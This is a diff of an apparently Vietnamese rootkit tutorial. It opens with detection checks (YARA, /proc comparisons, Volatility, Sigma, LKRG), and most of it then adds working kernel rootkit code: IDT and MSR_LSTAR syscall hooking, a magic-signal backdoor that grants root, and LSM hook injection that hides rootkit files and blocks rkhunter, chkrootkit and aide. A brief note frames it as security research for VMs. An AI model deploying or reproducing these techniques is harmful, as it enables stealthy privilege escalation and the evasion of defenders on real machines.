 rule Linux_Rootkit_Generic {
@@ -7570,20 +11648,20 @@ YARA
 
 # Scan: yara rootkit_detector.yar /lib/modules/$(uname -r)/
 
-# ── 2. Volatile Checks (runtime) ──
+# -- 2. Volatile Checks (runtime) --
 
 # Check syscall table integrity
-# Mọi entry phải trỏ vào kernel text section [_stext, _etext]
+# Moi entry phai tro vao kernel text section [_stext, _etext]
 cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _stext"
 cat /proc/kallsyms | grep -E "^[0-9a-f]+ T _etext"
-# So sánh với: cat /proc/kallsyms | grep sys_call_table
-# Dump entries và verify range
+# So sanh voi: cat /proc/kallsyms | grep sys_call_table
+# Dump entries va verify range
 
 # Check hidden modules
-# Method: so sánh /proc/modules với /sys/module/
+# Method: so sanh /proc/modules voi /sys/module/
 diff <(cat /proc/modules | awk '{print $1}' | sort) \
      <(ls /sys/module/ | sort)
-# Mismatch = hidden module hoặc built-in module
+# Mismatch = hidden module hoac built-in module
 
 # Check ftrace hooks
 cat /sys/kernel/debug/tracing/enabled_functions
@@ -7592,25 +11670,25 @@ cat /sys/kernel/debug/tracing/set_ftrace_filter
 
 # Check kprobes
 cat /sys/kernel/debug/kprobes/list
-# Unexpected probes trên sys_* functions = suspicious
+# Unexpected probes tren sys_* functions = suspicious
 
 # Check eBPF programs  
 bpftool prog list
 bpftool map list
-# Unexpected programs, đặc biệt kprobe/tracepoint type = suspicious
+# Unexpected programs, dac biet kprobe/tracepoint type = suspicious
 
-# ── 3. Memory Forensics (LiME + Volatility) ──
+# -- 3. Memory Forensics (LiME + Volatility) --
 
 # Dump memory
 sudo insmod lime.ko "path=/tmp/memdump.raw format=raw"
 
-# Analyze với Volatility 3
+# Analyze voi Volatility 3
 vol3 -f /tmp/memdump.raw linux.lsmod.Lsmod
 vol3 -f /tmp/memdump.raw linux.check_syscall.Check_syscall
 vol3 -f /tmp/memdump.raw linux.hidden_modules.Hidden_modules
 vol3 -f /tmp/memdump.raw linux.check_idt.Check_idt
 
-# ── 4. Sigma Rule (cho SIEM) ──
+# -- 4. Sigma Rule (cho SIEM) --
 cat > rootkit_detect.yml << 'SIGMA'
 title: Suspicious Kernel Module Load
 status: experimental
@@ -7631,14 +11709,14 @@ detection:
 level: high
 SIGMA
 
-# ── 5. LKRG (Linux Kernel Runtime Guard) ──
-# Install và configure LKRG cho runtime integrity monitoring
+# -- 5. LKRG (Linux Kernel Runtime Guard) --
+# Install va configure LKRG cho runtime integrity monitoring
 # LKRG detect: syscall table modifications, credential changes,
-# module hiding, và nhiều rootkit indicators khác.
+# module hiding, va nhieu rootkit indicators khac.
 # https://lkrg.org/
 ```
 
-### Volatility3 Custom Plugin — Detect Rootkit Indicators
+### Volatility3 Custom Plugin --- Detect Rootkit Indicators
 
 ```python
 # volatility3 plugin: detect_rootkit.py
@@ -7731,8 +11809,8 @@ class DetectRootkit(interfaces.plugins.PluginInterface):
             except Exception:
                 continue
 
-        # Check 4: DKOM — processes in memory not in task list
-        # (Requires walking slab allocator — simplified here)
+        # Check 4: DKOM --- processes in memory not in task list
+        # (Requires walking slab allocator --- simplified here)
 
     def run(self):
         return renderers.TreeGrid(
@@ -7743,47 +11821,73 @@ class DetectRootkit(interfaces.plugins.PluginInterface):
 
 ---
 
-*Tài liệu phục vụ nghiên cứu bảo mật. Thực hành trong VM được phép, trên hệ thống thật yêu cầu ủy quyền.*
+*Tai lieu phuc vu nghien cuu bao mat. Thuc hanh trong VM duoc phep, tren he thong that yeu cau uy quyen.*
 
 ---
-
 # Part IV — Advanced Techniques
 
 ## Appendix A: Advanced Hooking
 
 ### A.1 IDT Hooking
 
+**Deep Kernel Internals: IDT Architecture trên x86-64**
+
+IDT (Interrupt Descriptor Table) la bang 256 entries, moi entry la mot `gate_desc` struct 16 bytes:
+
+```
+struct gate_desc {
+    u16 offset_low;    // bits [15:0] cua handler address
+    u16 segment;       // code segment selector (thuong la __KERNEL_CS = 0x10)
+    struct {
+        u16 ist:3,     // Interrupt Stack Table index (0 = khong dung IST)
+            zero:5,    // reserved bits
+            type:4,    // gate type: 0xE = interrupt gate, 0xF = trap gate
+            dpl:2,     // Descriptor Privilege Level (0 = kernel only, 3 = user)
+            p:1;       // present bit (1 = valid entry)
+    };
+    u16 offset_middle; // bits [31:16]
+    u32 offset_high;   // bits [63:32]
+    u32 reserved;
+};
+
+Handler address = offset_high : offset_middle : offset_low (concatenated thanh 64-bit)
+```
+
+IDTR register chua base address va limit cua IDT. CPU dung `LIDT` de load, `SIDT` de store IDTR. Khi interrupt/exception xay ra, CPU doc `IDT[vector]` tu IDTR.base de tim handler.
+
+Tren modern SMP kernels (multi-CPU), moi CPU co the co IDT copy rieng — kernel copy IDT sang per-CPU region de tranh contention. Khi hook IDT, phai cap nhat tren TAT CA CPUs hoac hook se chi active tren 1 CPU.
+
 ```c
 /* idt_hook.c — IDT entry modification
  *
- * File chính Chapter 2 Method 4 chỉ SCAN IDT để tìm sys_call_table.
- * Ở đây ta thực sự MODIFY IDT entry để redirect interrupt handler.
+ * File chinh Chapter 2 Method 4 chi SCAN IDT de tim sys_call_table.
+ * O day ta thuc su MODIFY IDT entry de redirect interrupt handler.
  *
  * IDT (Interrupt Descriptor Table):
- *   - 256 entries, mỗi entry = gate descriptor (16 bytes trên x86-64)
- *   - Mỗi entry trỏ tới handler function cho interrupt/exception đó
+ *   - 256 entries, moi entry = gate descriptor (16 bytes tren x86-64)
+ *   - Moi entry tro toi handler function cho interrupt/exception do
  *   - CPU lookup IDT khi: INT instruction, hardware interrupt, exception
  *
- * Kỹ thuật: thay thế handler cho INT 0x80 (legacy 32-bit syscall)
- * hoặc exception handler (page fault, general protection, etc.)
+ * Ky thuat: thay the handler cho INT 0x80 (legacy 32-bit syscall)
+ * hoac exception handler (page fault, general protection, etc.)
  *
- * Tại sao IDT hooking ít phổ biến:
- *   - INT 0x80 deprecated trên 64-bit (dùng SYSCALL instruction thay)
- *   - IDT modification dễ detect (LKRG check IDT integrity)
- *   - Chỉ 1 IDT per CPU (trên SMP phải hook tất cả CPUs)
- *   - Kernel 5.x+ có protections (ro_after_init)
+ * Tai sao IDT hooking it pho bien:
+ *   - INT 0x80 deprecated tren 64-bit (dung SYSCALL instruction thay)
+ *   - IDT modification de detect (LKRG check IDT integrity)
+ *   - Chi 1 IDT per CPU (tren SMP phai hook tat ca CPUs)
+ *   - Kernel 5.x+ co protections (ro_after_init)
  *
- * Vẫn useful vì:
- *   - Hook exception handlers (page fault → hide memory access)
+ * Van useful vi:
+ *   - Hook exception handlers (page fault -> hide memory access)
  *   - Hook NMI handler (stealth debugging)
- *   - Một số detection tools không check IDT
+ *   - Mot so detection tools khong check IDT
  */
 
 #include "rootkit.h"
 #include <asm/desc.h>       /* gate_desc, idt_table */
 #include <asm/desc_defs.h>  /* IDT entry structures */
 
-/* IDT gate descriptor layout trên x86-64 (16 bytes):
+/* IDT gate descriptor layout tren x86-64 (16 bytes):
  *
  *   Bytes 0-1:   offset_low   (bits 0-15 of handler address)
  *   Bytes 2-3:   segment      (code segment selector, usually 0x10)
@@ -7804,7 +11908,7 @@ struct idt_backup {
 
 static struct idt_backup idt_saved;
 
-/* ── Extract handler address từ gate descriptor ── */
+/* -- Extract handler address tu gate descriptor -- */
 static unsigned long gate_to_addr(gate_desc *gate)
 {
     unsigned long addr;
@@ -7817,11 +11921,11 @@ static unsigned long gate_to_addr(gate_desc *gate)
     return addr;
 }
 
-/* ── Lấy IDT base address ──
+/* -- Lay IDT base address --
  *
- * SIDT instruction store IDT register (IDTR) vào memory.
- * IDTR chứa: limit (2 bytes) + base address (8 bytes trên x86-64).
- * Base address = pointer tới IDT table trong memory.
+ * SIDT instruction store IDT register (IDTR) vao memory.
+ * IDTR chua: limit (2 bytes) + base address (8 bytes tren x86-64).
+ * Base address = pointer toi IDT table trong memory.
  */
 static gate_desc *get_idt_table(void)
 {
@@ -7830,34 +11934,34 @@ static gate_desc *get_idt_table(void)
     return (gate_desc *)idtr.address;
 }
 
-/* ── Custom INT 0x80 handler ──
+/* -- Custom INT 0x80 handler --
  *
- * Khi process chạy INT 0x80 (legacy syscall):
+ * Khi process chay INT 0x80 (legacy syscall):
  *   1. CPU lookup IDT[0x80]
- *   2. Jump tới handler address trong IDT entry
- *   3. Handler chạy (ta control handler bây giờ)
+ *   2. Jump toi handler address trong IDT entry
+ *   3. Handler chay (ta control handler bay gio)
  *
  * Registry state khi INT 0x80 trigger:
  *   eax = syscall number
  *   ebx = arg1, ecx = arg2, edx = arg3
  *   esi = arg4, edi = arg5, ebp = arg6
  *
- * QUAN TRỌNG: handler phải:
- *   1. Save tất cả registers
- *   2. Xử lý (intercept/modify)
- *   3. Jump tới original handler HOẶC return
- *   4. KHÔNG ĐƯỢC corrupt stack/registers
+ * QUAN TRONG: handler phai:
+ *   1. Save tat ca registers
+ *   2. Xu ly (intercept/modify)
+ *   3. Jump toi original handler HOAC return
+ *   4. KHONG DUOC corrupt stack/registers
  */
 
-/* Handler viết bằng ASM vì phải control register state chính xác */
+/* Handler viet bang ASM vi phai control register state chinh xac */
 extern void idt_hook_stub(void);
 
-/* C handler gọi từ ASM stub */
+/* C handler goi tu ASM stub */
 static void idt_hook_handler(struct pt_regs *regs)
 {
     /* Intercept specific syscall numbers */
     if (regs->ax == __NR_getdents64) {
-        /* Log hoặc modify — tùy implementation */
+        /* Log hoac modify — tuy implementation */
     }
 }
 ```
@@ -7867,17 +11971,17 @@ ASM stub (idt_hook_stub.S):
 ```asm
 /* ASM stub cho IDT hook handler.
  *
- * pt_regs layout (từ struct pt_regs trong arch/x86/include/asm/ptrace.h):
+ * pt_regs layout (tu struct pt_regs trong arch/x86/include/asm/ptrace.h):
  *   offset 0:   r15
  *   offset 8:   r14
  *   ...
  *   offset 104: rdi
  *   offset 112: orig_rax
  *
- * Stack grows DOWN. Phải push rdi FIRST (highest offset, pushed first
- * = highest address) → r15 LAST (offset 0, pushed last = lowest = RSP).
+ * Stack grows DOWN. Phai push rdi FIRST (highest offset, pushed first
+ * = highest address) -> r15 LAST (offset 0, pushed last = lowest = RSP).
  *
- * Sau tất cả pushes: RSP[0] = r15 ← ĐÚNG vì r15 pushed cuối cùng.
+ * Sau tat ca pushes: RSP[0] = r15 <- DUNG vi r15 pushed cuoi cung.
  */
 
 #include <linux/linkage.h>
@@ -7888,9 +11992,9 @@ ASM stub (idt_hook_stub.S):
 SYM_CODE_START(idt_hook_stub)
     cli
 
-    /* Push theo thứ tự KERNEL ENTRY: rdi first, r15 last.
-     * Sau pushes: RSP trỏ tới pt_regs-compatible frame. */
-    push %rdi       /* offset 104 → pushed first → highest addr */
+    /* Push theo thu tu KERNEL ENTRY: rdi first, r15 last.
+     * Sau pushes: RSP tro toi pt_regs-compatible frame. */
+    push %rdi       /* offset 104 -> pushed first -> highest addr */
     push %rsi       /* offset 96 */
     push %rdx       /* offset 88 */
     push %rcx       /* offset 80 */
@@ -7903,16 +12007,16 @@ SYM_CODE_START(idt_hook_stub)
     push %rbp       /* offset 24 */
     push %r12       /* offset 16 */
     push %r13       /* offset 8 */
-    push %r14       /* offset 0... wait, nhưng phải push r15 cuối */
-    push %r15       /* offset 0 → pushed last → RSP points here */
+    push %r14       /* offset 0... wait, nhung phai push r15 cuoi */
+    push %r15       /* offset 0 -> pushed last -> RSP points here */
 
-    /* RSP bây giờ = pointer tới r15 slot = pt_regs offset 0.
+    /* RSP bay gio = pointer toi r15 slot = pt_regs offset 0.
      * regs->r15 = RSP[0], regs->r14 = RSP[8], ..., regs->di = RSP[104]
      * MATCHES struct pt_regs layout! */
     mov %rsp, %rdi
     call idt_hook_handler
 
-    /* Restore ngược lại: r15 first (pop from RSP[0]) */
+    /* Restore nguoc lai: r15 first (pop from RSP[0]) */
     pop %r15
     pop %r14
     pop %r13
@@ -7937,19 +12041,19 @@ SYM_DATA(orig_idt_handler_addr, .quad 0)
 ```
 
 ```c
-/* ── Build modified gate descriptor ── */
+/* -- Build modified gate descriptor -- */
 static void build_gate(gate_desc *gate, unsigned long handler)
 {
-    /* Pack 64-bit address vào 3 offset fields */
+    /* Pack 64-bit address vao 3 offset fields */
     gate->offset_low    = (u16)(handler & 0xFFFF);
     gate->offset_middle = (u16)((handler >> 16) & 0xFFFF);
 #ifdef CONFIG_X86_64
     gate->offset_high   = (u32)((handler >> 32) & 0xFFFFFFFF);
 #endif
-    /* Giữ nguyên segment, IST, type, DPL, present từ original */
+    /* Giu nguyen segment, IST, type, DPL, present tu original */
 }
 
-/* ── Install IDT hook ── */
+/* -- Install IDT hook -- */
 static int install_idt_hook(unsigned int vector, void *new_handler)
 {
     gate_desc *idt;
@@ -7969,16 +12073,16 @@ static int install_idt_hook(unsigned int vector, void *new_handler)
     memcpy(&new_gate, &idt[vector], sizeof(gate_desc));
     build_gate(&new_gate, (unsigned long)new_handler);
 
-    /* Write new entry — cần bypass write protection.
+    /* Write new entry — can bypass write protection.
      *
-     * IDT nằm trong read-only memory trên kernel mới.
-     * Phải dùng set_memory_rw hoặc PTE manipulation.
-     * Hoặc: dùng write_idt_entry() kernel API nếu available. */
+     * IDT nam trong read-only memory tren kernel moi.
+     * Phai dung set_memory_rw hoac PTE manipulation.
+     * Hoac: dung write_idt_entry() kernel API neu available. */
     rk_unprotect_memory();
 
-    /* Phải update trên ALL CPUs (SMP safety).
-     * Mỗi CPU CÓ THỂ có IDT riêng (nhưng thường share).
-     * load_idt() per-CPU nếu cần. */
+    /* Phai update tren ALL CPUs (SMP safety).
+     * Moi CPU CO THE co IDT rieng (nhung thuong share).
+     * load_idt() per-CPU neu can. */
     unsigned long flags;
     local_irq_save(flags);
     memcpy(&idt[vector], &new_gate, sizeof(gate_desc));
@@ -7986,12 +12090,12 @@ static int install_idt_hook(unsigned int vector, void *new_handler)
 
     rk_protect_memory();
 
-    pr_info("rk: IDT[%u] hooked: %px → %px\n",
+    pr_info("rk: IDT[%u] hooked: %px -> %px\n",
             vector, (void *)idt_saved.orig_handler, new_handler);
     return 0;
 }
 
-/* ── Remove IDT hook ── */
+/* -- Remove IDT hook -- */
 static void remove_idt_hook(void)
 {
     gate_desc *idt = get_idt_table();
@@ -8011,51 +12115,68 @@ static void remove_idt_hook(void)
 
 ### A.2 MSR Hooking
 
+**Deep Kernel Internals: Model-Specific Registers (MSRs)**
+
+MSR (Model-Specific Registers) la cac CPU configuration registers truy cap qua hai instructions dac biet:
+- `RDMSR`: doc MSR. ECX = MSR index, ket qua trong EDX:EAX (64-bit value).
+- `WRMSR`: ghi MSR. ECX = MSR index, EDX:EAX = gia tri ghi.
+
+Cac MSR quan trong cho rootkit hooking:
+
+```
+MSR_LSTAR  (0xC0000082) — Dia chi entry_SYSCALL_64, CPU jump toi day khi SYSCALL
+MSR_STAR   (0xC0000081) — Segment selectors cho SYSCALL/SYSRET transition
+MSR_FMASK  (0xC0000084) — RFLAGS mask: bits nao bi clear khi SYSCALL execute
+IA32_SYSENTER_EIP (0x176) — 32-bit SYSENTER entry point (legacy, compat mode)
+```
+
+Diem quan trong: MSR la **per-CPU register** — moi CPU core co gia tri MSR rieng. Ghi MSR_LSTAR tren CPU 0 khong anh huong CPU 1. De hook toan he thong, phai dung `on_each_cpu()` de thuc thi WRMSR tren moi CPU qua IPI (Inter-Processor Interrupt).
+
 ```c
 /* msr_hook.c — SYSCALL entry point redirection via MSR_LSTAR
  *
- * File chính Chapter 2 Method 3 chỉ ĐỌC MSR_LSTAR.
- * Ở đây ta GHI MSR_LSTAR để redirect syscall entry.
+ * File chinh Chapter 2 Method 3 chi DOC MSR_LSTAR.
+ * O day ta GHI MSR_LSTAR de redirect syscall entry.
  *
  * MSR_LSTAR (0xC0000082):
- *   Chứa address của entry_SYSCALL_64 — function kernel chạy
- *   mỗi khi userspace execute SYSCALL instruction.
+ *   Chua address cua entry_SYSCALL_64 — function kernel chay
+ *   moi khi userspace execute SYSCALL instruction.
  *
- * SYSCALL flow bình thường:
- *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới entry_SYSCALL_64
- *   → entry_SYSCALL_64 save regs → lookup sys_call_table → call handler
+ * SYSCALL flow binh thuong:
+ *   User: SYSCALL -> CPU reads MSR_LSTAR -> jump toi entry_SYSCALL_64
+ *   -> entry_SYSCALL_64 save regs -> lookup sys_call_table -> call handler
  *
  * SYSCALL flow sau MSR hook:
- *   User: SYSCALL → CPU reads MSR_LSTAR → jump tới OUR handler
- *   → OUR handler: intercept → call original entry_SYSCALL_64
+ *   User: SYSCALL -> CPU reads MSR_LSTAR -> jump toi OUR handler
+ *   -> OUR handler: intercept -> call original entry_SYSCALL_64
  *
- * Ưu điểm:
- *   - Hook TẤT CẢ syscalls cùng lúc (không cần hook từng entry)
- *   - Sâu hơn syscall table hooking
- *   - Một số detection tools chỉ check syscall table, không check MSR
+ * Uu diem:
+ *   - Hook TAT CA syscalls cung luc (khong can hook tung entry)
+ *   - Sau hon syscall table hooking
+ *   - Mot so detection tools chi check syscall table, khong check MSR
  *
- * Nhược điểm:
- *   - Phải handle trên TỪNG CPU (MSR là per-CPU register)
- *   - Rất dễ crash nếu handler code sai (brick hệ thống)
- *   - LKRG và một số tools check MSR_LSTAR
- *   - Performance impact nếu handler không tối ưu
+ * Nhuoc diem:
+ *   - Phai handle tren TUNG CPU (MSR la per-CPU register)
+ *   - Rat de crash neu handler code sai (brick he thong)
+ *   - LKRG va mot so tools check MSR_LSTAR
+ *   - Performance impact neu handler khong toi uu
  *
- * MSR_LSTAR hooking yêu cầu:
- *   - Perfect ASM stub compatible với TỪNG kernel build
+ * MSR_LSTAR hooking yeu cau:
+ *   - Perfect ASM stub compatible voi TUNG kernel build
  *   - Handle KPTI page table switch
  *   - Handle spectre mitigations
- *   - Hardcoded GS offsets vary per kernel build → not portable
+ *   - Hardcoded GS offsets vary per kernel build -> not portable
  *
- * Approach an toàn: Hook entry_SYSCALL_64 via ftrace thay vì
- * modify MSR trực tiếp. Kết quả tương đương, an toàn hơn nhiều.
+ * Approach an toan: Hook entry_SYSCALL_64 via ftrace thay vi
+ * modify MSR truc tiep. Ket qua tuong duong, an toan hon nhieu.
  * Xem Chapter 4 ftrace hooking cho full implementation.
  *
- * Nếu THẬT SỰ cần MSR hook, dùng approach sau:
- * dùng on_each_cpu + wrmsr, redirect tới trampoline allocated bằng
- * __vmalloc(PAGE_KERNEL_EXEC) chứa:
+ * Neu THAT SU can MSR hook, dung approach sau:
+ * dung on_each_cpu + wrmsr, redirect toi trampoline allocated bang
+ * __vmalloc(PAGE_KERNEL_EXEC) chua:
  *   1. Full register save (matching kernel's own entry code)
  *   2. Call C filter
- *   3. Check return → jmp original or sysret
+ *   3. Check return -> jmp original or sysret
  *
  * Template-based: copy kernel's own entry_SYSCALL_64 code,
  * patch in our filter call.
@@ -8066,16 +12187,16 @@ static void remove_idt_hook(void)
 
 static unsigned long orig_lstar;
 
-/* ── C callback — gọi từ trampoline khi syscall number match ── */
+/* -- C callback — goi tu trampoline khi syscall number match -- */
 static long msr_hook_filter(unsigned long syscall_nr,
                              struct pt_regs *regs)
 {
-    /* Ví dụ: intercept kill() for magic signal */
+    /* Vi du: intercept kill() for magic signal */
     if (syscall_nr == __NR_kill) {
         pid_t pid = (pid_t)regs->di;
         int sig = (int)regs->si;
         if (sig == MAGIC_SIGNAL && pid == MAGIC_PID) {
-            /* Give root — xử lý trong đây */
+            /* Give root — xu ly trong day */
             struct cred *new = prepare_creds();
             if (new) {
                 new->uid.val = new->euid.val = 0;
@@ -8090,7 +12211,7 @@ static long msr_hook_filter(unsigned long syscall_nr,
     return -1;  /* Not intercepted — proceed to original */
 }
 
-/* ── Read original MSR_LSTAR và save ── */
+/* -- Read original MSR_LSTAR va save -- */
 static int msr_hook_save(void)
 {
     rdmsrl(MSR_LSTAR, orig_lstar);
@@ -8098,13 +12219,13 @@ static int msr_hook_save(void)
     return 0;
 }
 
-/* ── Restore original MSR_LSTAR trên tất cả CPUs ──
+/* -- Restore original MSR_LSTAR tren tat ca CPUs --
  *
- * MSR_LSTAR là per-CPU: mỗi CPU core có giá trị riêng.
- * Phải update trên TẤT CẢ CPUs.
+ * MSR_LSTAR la per-CPU: moi CPU core co gia tri rieng.
+ * Phai update tren TAT CA CPUs.
  *
- * on_each_cpu(): gọi function trên mỗi CPU (IPI = Inter-Processor Interrupt).
- * Function chạy trong interrupt context trên mỗi CPU.
+ * on_each_cpu(): goi function tren moi CPU (IPI = Inter-Processor Interrupt).
+ * Function chay trong interrupt context tren moi CPU.
  */
 static void msr_hook_restore_cpu(void *info)
 {
@@ -8117,8 +12238,8 @@ static void msr_hook_remove(void)
     pr_info("rk: MSR_LSTAR restored\n");
 }
 
-/* Cho educational purposes, hook syscall entry via ftrace thay vì
- * modify MSR trực tiếp. Kết quả tương đương, an toàn hơn nhiều.
+/* Cho educational purposes, hook syscall entry via ftrace thay vi
+ * modify MSR truc tiep. Ket qua tuong duong, an toan hon nhieu.
  * Xem Chapter 4 ftrace hooking cho implementation. */
 ```
 
@@ -8126,39 +12247,55 @@ static void msr_hook_remove(void)
 
 ### A.3 LSM Hook Abuse
 
+**Deep Kernel Internals: LSM Framework Architecture**
+
+LSM (Linux Security Modules) framework hoat dong qua struct `security_hook_heads` — mot struct chua `hlist_head` cho MOI security hook point (hang tram hook points). Moi registered security module (SELinux, AppArmor, SMACK) them `security_hook_list` entries vao cac hlist nay.
+
+Khi kernel thuc hien permission check (vd: mo file, tao process, ket noi socket), no goi `security_*()` function tuong ung. Function nay iterate qua hlist cua hook do, goi tung registered callback. **TAT CA callbacks phai return 0** de operation duoc phep — bat ky callback nao return non-zero se block operation.
+
+```
+security_file_permission(file, mask)
+  -> iterate security_hook_heads.file_permission hlist
+     -> SELinux: selinux_file_permission() -> return 0 (allow) hoac -EACCES
+     -> AppArmor: apparmor_file_permission() -> return 0 hoac -EACCES
+     -> Rootkit: rk_file_permission() -> return 0 (luon allow) hoac -ENOENT (an file)
+```
+
+Rootkit co the: (1) them hook rieng luon return 0 de bypass moi check, (2) xoa hooks cua SELinux/AppArmor khoi hlist de vo hieu hoa chung, hoac (3) dang ky hook tra ve -ENOENT/EACCES de block truy cap vao rootkit files.
+
 ```c
-/* lsm_abuse.c — Lạm dụng Linux Security Module framework
+/* lsm_abuse.c — Lam dung Linux Security Module framework
  *
- * LSM = framework cho phép security modules (SELinux, AppArmor, SMACK)
- * hook vào kernel operations. Mỗi sensitive operation gọi
- * security_*() function → LSM hook chain.
+ * LSM = framework cho phep security modules (SELinux, AppArmor, SMACK)
+ * hook vao kernel operations. Moi sensitive operation goi
+ * security_*() function -> LSM hook chain.
  *
- * Rootkit abuse: đăng ký LSM module giả → hook mọi security-sensitive
+ * Rootkit abuse: dang ky LSM module gia -> hook moi security-sensitive
  * operation (file access, process creation, socket operations, etc.)
  *
- * Ưu điểm so với syscall hooking:
- *   - LSM hooks ở ĐÚNG security decision point
- *   - Hàng trăm hook points (nhiều hơn syscall table)
- *   - "Legitimate" — admin cài LSM module = bình thường
- *   - Stacking LSM (kernel 5.x+): nhiều LSMs cùng lúc
+ * Uu diem so voi syscall hooking:
+ *   - LSM hooks o DUNG security decision point
+ *   - Hang tram hook points (nhieu hon syscall table)
+ *   - "Legitimate" — admin cai LSM module = binh thuong
+ *   - Stacking LSM (kernel 5.x+): nhieu LSMs cung luc
  *
- * Nhược điểm:
+ * Nhuoc diem:
  *   - LSM registration API restricted (security_add_hooks)
- *   - Kernel CONFIG_LSM_STACKING hoặc CONFIG_SECURITY cần enabled
- *   - Một số kernel không cho register LSM sau boot
+ *   - Kernel CONFIG_LSM_STACKING hoac CONFIG_SECURITY can enabled
+ *   - Mot so kernel khong cho register LSM sau boot
  *
  * APT context: Winnti group exploit LSM-like mechanisms.
  */
 
 #include "rootkit.h"
-#include <linux/lsm_hooks.h>   /* security_hook_list, các macro */
+#include <linux/lsm_hooks.h>   /* security_hook_list, cac macro */
 #include <linux/security.h>
 
-/* ── LSM Hook: file_permission ──
+/* -- LSM Hook: file_permission --
  *
- * Gọi mỗi khi process access file. Có thể:
- *   - Log tất cả file access
- *   - Block access tới specific files
+ * Goi moi khi process access file. Co the:
+ *   - Log tat ca file access
+ *   - Block access toi specific files
  *   - Hide files (return -ENOENT cho "invisible" files)
  */
 static int rk_file_permission(struct file *file, int mask)
@@ -8173,45 +12310,45 @@ static int rk_file_permission(struct file *file, int mask)
     if (IS_ERR(path))
         return 0;
 
-    /* Ẩn rootkit files: return -ENOENT khi ai đọc file rootkit */
+    /* An rootkit files: return -ENOENT khi ai doc file rootkit */
     if (strstr(path, HIDDEN_PREFIX))
-        return -ENOENT;  /* File "không tồn tại" */
+        return -ENOENT;  /* File "khong ton tai" */
 
-    return 0;  /* Allow mọi thứ khác */
+    return 0;  /* Allow moi thu khac */
 }
 
-/* ── LSM Hook: task_kill ──
+/* -- LSM Hook: task_kill --
  *
- * Gọi khi process gửi signal. Intercept magic signal.
+ * Goi khi process gui signal. Intercept magic signal.
  */
 static int rk_task_kill(struct task_struct *p, struct kernel_siginfo *info,
                          int sig, const struct cred *cred)
 {
     if (sig == MAGIC_SIGNAL) {
-        /* Xử lý magic signal — give root, hide process, etc. */
-        return 0;  /* Allow (đã xử lý trong syscall hook) */
+        /* Xu ly magic signal — give root, hide process, etc. */
+        return 0;  /* Allow (da xu ly trong syscall hook) */
     }
     return 0;
 }
 
-/* ── LSM Hook: inode_permission ──
+/* -- LSM Hook: inode_permission --
  *
- * Gọi TRƯỚC mỗi inode access. Sâu hơn file_permission.
- * Control access tới files, directories, devices.
+ * Goi TRUOC moi inode access. Sau hon file_permission.
+ * Control access toi files, directories, devices.
  */
 static int rk_inode_permission(struct inode *inode, int mask)
 {
-    /* Có thể dùng để:
-     * - Block read access tới /sys/kernel/debug/kprobes/list
-     *   (chống detection)
-     * - Block write tới rootkit persistence files
-     *   (chống removal) */
+    /* Co the dung de:
+     * - Block read access toi /sys/kernel/debug/kprobes/list
+     *   (chong detection)
+     * - Block write toi rootkit persistence files
+     *   (chong removal) */
     return 0;
 }
 
-/* ── LSM Hook: socket_connect ──
+/* -- LSM Hook: socket_connect --
  *
- * Gọi khi process connect() socket. Monitor outbound connections.
+ * Goi khi process connect() socket. Monitor outbound connections.
  */
 static int rk_socket_connect(struct socket *sock,
                                struct sockaddr *address,
@@ -8219,17 +12356,17 @@ static int rk_socket_connect(struct socket *sock,
 {
     if (address->sa_family == AF_INET) {
         struct sockaddr_in *sin = (struct sockaddr_in *)address;
-        /* Log mọi outbound TCP connection */
+        /* Log moi outbound TCP connection */
         pr_info("rk: connect to %pI4:%d\n",
                 &sin->sin_addr, ntohs(sin->sin_port));
     }
     return 0;
 }
 
-/* ── LSM Hook: bprm_check_security ──
+/* -- LSM Hook: bprm_check_security --
  *
- * Gọi TRƯỚC mỗi execve. Có thể block execution hoặc log.
- * Tại đây ta CÓ QUYỀN nói "no" cho execution.
+ * Goi TRUOC moi execve. Co the block execution hoac log.
+ * Tai day ta CO QUYEN noi "no" cho execution.
  */
 static int rk_bprm_check(struct linux_binprm *bprm)
 {
@@ -8238,31 +12375,31 @@ static int rk_bprm_check(struct linux_binprm *bprm)
         if (strstr(bprm->filename, "rkhunter") ||
             strstr(bprm->filename, "chkrootkit") ||
             strstr(bprm->filename, "aide")) {
-            /* Return -EACCES = "Permission denied" khi chạy detection tool.
-             * Hoặc: không block mà chỉ log (stealth hơn). */
+            /* Return -EACCES = "Permission denied" khi chay detection tool.
+             * Hoac: khong block ma chi log (stealth hon). */
             return -EACCES;
         }
     }
     return 0;
 }
 
-/* ── Đăng ký LSM hooks ──
+/* -- Dang ky LSM hooks --
  *
- * Trên kernel có CONFIG_SECURITY=y, ta dùng security_add_hooks().
- * Tuy nhiên API này thường restricted (not exported).
+ * Tren kernel co CONFIG_SECURITY=y, ta dung security_add_hooks().
+ * Tuy nhien API nay thuong restricted (not exported).
  *
- * Workaround: Tìm security_hook_heads (struct chứa list heads
- * cho mỗi hook type) qua kallsyms, rồi list_add trực tiếp.
+ * Workaround: Tim security_hook_heads (struct chua list heads
+ * cho moi hook type) qua kallsyms, roi list_add truc tiep.
  *
- * Đây là DKOM approach cho LSM — thêm hook trực tiếp vào
- * linked list thay vì dùng official API.
+ * Day la DKOM approach cho LSM — them hook truc tiep vao
+ * linked list thay vi dung official API.
  */
 
 struct security_hook_heads *rk_hook_heads = NULL;
 
-/* Hook list entries — mỗi entry link vào một hook chain */
+/* Hook list entries — moi entry link vao mot hook chain */
 static struct security_hook_list rk_hooks[] = {
-    /* Macro LSM_HOOK_INIT tạo security_hook_list entry:
+    /* Macro LSM_HOOK_INIT tao security_hook_list entry:
      *   .head = &security_hook_heads->hook_name
      *   .hook.hook_name = function pointer */
     LSM_HOOK_INIT(file_permission, rk_file_permission),
@@ -8274,7 +12411,7 @@ static struct security_hook_list rk_hooks[] = {
 
 static int rk_lsm_install(void)
 {
-    /* Tìm security_hook_heads structure */
+    /* Tim security_hook_heads structure */
     rk_hook_heads = (struct security_hook_heads *)
         rk_lookup_name("security_hook_heads");
 
@@ -8283,14 +12420,14 @@ static int rk_lsm_install(void)
         return -ENOENT;
     }
 
-    /* Trực tiếp add hooks vào linked lists (DKOM approach).
-     * Mỗi hook type trong security_hook_heads là hlist_head.
-     * Ta add entry vào cuối list. */
+    /* Truc tiep add hooks vao linked lists (DKOM approach).
+     * Moi hook type trong security_hook_heads la hlist_head.
+     * Ta add entry vao cuoi list. */
     int i;
     for (i = 0; i < ARRAY_SIZE(rk_hooks); i++) {
         struct security_hook_list *shook = &rk_hooks[i];
-        /* hlist_add_tail_rcu: add vào cuối list, RCU-safe.
-         * Hooks mới active cho mọi subsequent security checks. */
